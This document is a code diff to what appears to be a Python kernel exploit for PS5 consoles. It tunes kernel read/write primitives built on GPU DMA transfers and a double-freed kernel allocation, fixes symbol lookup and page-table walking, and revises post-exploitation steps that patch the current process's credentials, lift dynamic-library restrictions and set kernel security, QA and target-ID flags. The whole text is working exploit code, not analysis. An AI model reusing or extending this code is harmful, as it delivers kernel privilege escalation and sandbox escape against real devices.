@@ -17,7 +17,7 @@ import pygame_sdl2
 from pygame_sdl2 import CONTROLLER_BUTTON_A
 from utils.ref import get_ref_addr
 from utils.etc import alloc, bytes
-from utils.unsafe import readuint, readbuf
+from utils.unsafe import readuint, readbuf, writebuf
 from utils.conversion import u64_to_i64, get_cstring
 from utils.rp import log, log_exc
 from sc import sc
@@ -1125,6 +1125,8 @@ PROT_EXEC = 4
 
 GPU_READ = 0x10
 GPU_WRITE = 0x20
+
+LIBKERNEL_HANDLE = 0x2001
 
 # max number of requests that can be created/polled/canceled/deleted/waited
 MAX_AIO_IDS = 0x80
@@ -2705,11 +2707,16 @@ class Kernel(object):
     def read_null_terminated_string(self, kaddr):
         result = bytearray()
         while True:
-            char = self.read_buffer(kaddr, 1)
-            if char == 0 or char == b"\0":
+            char = self.read_buffer(kaddr, 8)
+            if len(char) == 0:
+                break
+
+            null_pos = char.find(b"\0")
+            if null_pos != -1:
+                result += char[:null_pos]
                 break
             result += char
-            kaddr += 1
+            kaddr += 8
         return str(result)
 
     def write_byte(self, kaddr, value):
@@ -2797,11 +2804,10 @@ def dangerous_virt_to_phys(virt_addr, cr3=kernel.kernel_cr3_addr):
     return cpu_walk_pt(cr3, virt_addr)
 
 
-def dangerous_dlsym(mod, symbol):
+def dangerous_dlsym(handle, symbol):
     out_buf = alloc(8)
-    symbol = symbol + b"\0"
 
-    if u64_to_i64(sc.syscalls.dlsym(mod, symbol, out_buf)) == -1:
+    if u64_to_i64(sc.syscalls.dlsym(handle, symbol, out_buf)) == -1:
         raise Exception(
             "dlsym error: %d\n%s"
             % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
@@ -2812,11 +2818,9 @@ def dangerous_dlsym(mod, symbol):
 
 def find_mod_by_name(name):
     sceKernelGetModuleListInternal = dangerous_dlsym(
-        sc.libkernel_addr, "sceKernelGetModuleListInternal"
+        LIBKERNEL_HANDLE, "sceKernelGetModuleListInternal"
     )
-    sceKernelGetModuleInfo = dangerous_dlsym(
-        sc.libkernel_addr, "sceKernelGetModuleInfo"
-    )
+    sceKernelGetModuleInfo = dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleInfo")
 
     mem = alloc(4 * 0x300)
     actual_num = alloc(8)
@@ -2852,11 +2856,11 @@ class GPU(object):
         # put these into global to make life easier
         self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
             "sceKernelAllocateMainDirectMemory",
-            dangerous_dlsym(sc.libkernel_addr, "sceKernelAllocateMainDirectMemory"),
+            dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory"),
         )
         self.sceKernelMapDirectMemory = sc.make_function_if_needed(
             "sceKernelMapDirectMemory",
-            dangerous_dlsym(sc.libkernel_addr, "sceKernelMapDirectMemory"),
+            dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"),
         )
         self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
             "sceGnmSubmitCommandBuffers",
@@ -3025,19 +3029,19 @@ class GPU(object):
         self.submit_dma_data_command(dest, src, size)
 
     def read_buffer(self, addr, size):
-        phys_addr = dangerous_virt_to_phys(addr)
+        phys_addr = dangerous_virt_to_phys(addr, kernel.kernel_cr3_addr)
         if phys_addr is None:
             raise Exception("failed to translate %s to physical addr" % hex(addr))
 
         self.transfer_physical_buffer(phys_addr, size, is_write=False)
-        return self.transfer_va[0:size]
+        return readbuf(self.transfer_va, size)
 
     def write_buffer(self, addr, buf):
-        phys_addr = dangerous_virt_to_phys(addr)
+        phys_addr = dangerous_virt_to_phys(addr, kernel.kernel_cr3_addr)
         if phys_addr is None:
             raise Exception("failed to translate %s to physical addr" % hex(addr))
 
-        self.transfer_va[0 : len(buf)] = buf
+        writebuf(self.transfer_va, buf)
         self.transfer_physical_buffer(phys_addr, len(buf), is_write=True)
 
     def read_byte(self, dest):
@@ -3045,8 +3049,8 @@ class GPU(object):
         return struct.unpack("<B", buf)[0]
 
     def read_word(self, dest):
-        buf = self.read_buffer(dest, 4)
-        return struct.unpack("<I", buf)[0]
+        buf = self.read_buffer(dest, 2)
+        return struct.unpack("<H", buf)[0]
 
     def read_dword(self, dest):
         buf = self.read_buffer(dest, 4)
@@ -3061,7 +3065,7 @@ class GPU(object):
         self.write_buffer(dest, buf)
 
     def write_word(self, dest, value):
-        buf = struct.pack("<I", value)
+        buf = struct.pack("<H", value)
         self.write_buffer(dest, buf)
 
     def write_dword(self, dest, value):
@@ -3085,7 +3089,7 @@ class GPU(object):
         pde_index = (virt_addr >> 21) & 0x1FF
 
         # pdb2
-        pml4e = kernel.read_qword(phys_to_dmap(pdb2_addr) + (pml4e_index * 8))
+        pml4e = kernel.read_qword(pdb2_addr + (pml4e_index * 8))
         if self.gpu_pde_field(pml4e, "VALID") != 1:
             return None, None
 
@@ -3141,13 +3145,13 @@ class GPU(object):
         out = alloc(8)
         mem_type = 1
 
-        ret = self.sceKernelAllocateMainDirectMemory(size, mem_type, out)
+        ret = self.sceKernelAllocateMainDirectMemory(size, size, mem_type, out)
         if ret != 0:
             raise Exception("sceKernelAllocateMainDirectMemory error: %d" % (ret))
 
         phys_addr = struct.unpack("<Q", out[0:8])[0]
 
-        out[0:8] = "\0" * 8
+        out[0:8] = b"\0" * 8
 
         ret = self.sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
         if ret != 0:
@@ -3242,7 +3246,7 @@ def find_vmspace_vmid_offset():
 
 
 def find_proc_offsets():
-    proc_data = readbuf(kernel.curproc_addr, 0x1000)
+    proc_data = kernel.read_buffer(kernel.curproc_addr, 0x1000)
 
     p_comm_pattern = [0xCE, 0xFA, 0xEF, 0xBE, 0xCC, 0xBB]
     p_comm_sign = 0
@@ -3290,8 +3294,8 @@ def find_additional_offsets():
 
     SELECTED_KERNEL_OFFSETS["PROC_COMM"] = PROC_COMM
     SELECTED_KERNEL_OFFSETS["PROC_SYSENT"] = PROC_SYSENT
-    SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_PMAP"] = vm_map_pmap_offset
-    SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_VMID"] = vm_map_vmid_offset
+    SELECTED_KERNEL_OFFSETS["VMSPACE_VM_PMAP"] = vm_map_pmap_offset
+    SELECTED_KERNEL_OFFSETS["VMSPACE_VM_VMID"] = vm_map_vmid_offset
 
 
 # k100_addr is double freed 0x100 malloc zone address
@@ -3492,7 +3496,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
     kernel.write_buffer = ipv6_kernel_rw.write_buffer
 
     kstr = kernel.read_null_terminated_string(kernel_addr)
-    debug_log('*(&"evf cv"): %s' % kstr)
+    log('*(&"evf cv"): %s' % kstr)
     if kstr != "evf cv":
         raise Exception('test read of &"evf cv" failed')
 
@@ -3760,7 +3764,7 @@ def post_exploitation_ps5():
         uid_before = sc.syscalls.getuid()
         in_sandbox_before = sc.syscalls.is_in_sandbox()
 
-        debug_log("patching curproc %s (authid = %s)", hex(proc), hex(authid))
+        debug_log("patching curproc %s (authid = %s)" % (hex(proc), hex(authid)))
 
         patch_ucred(ucred, authid)
         patch_dynlib_restriction(proc)
@@ -3780,13 +3784,19 @@ def post_exploitation_ps5():
             + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
         )
         target_id_flags_addr = (
-            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_TARGET_ID"]
+            kernel.data_base
+            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
+            + 0x9
         )
         qa_flags_addr = (
-            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_QA_FLAGS"]
+            kernel.data_base
+            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
+            + 0x24
         )
         utoken_flags_addr = (
-            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_UTOKEN_FLAGS"]
+            kernel.data_base
+            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
+            + 0x8C
         )
 
         # Set security flags
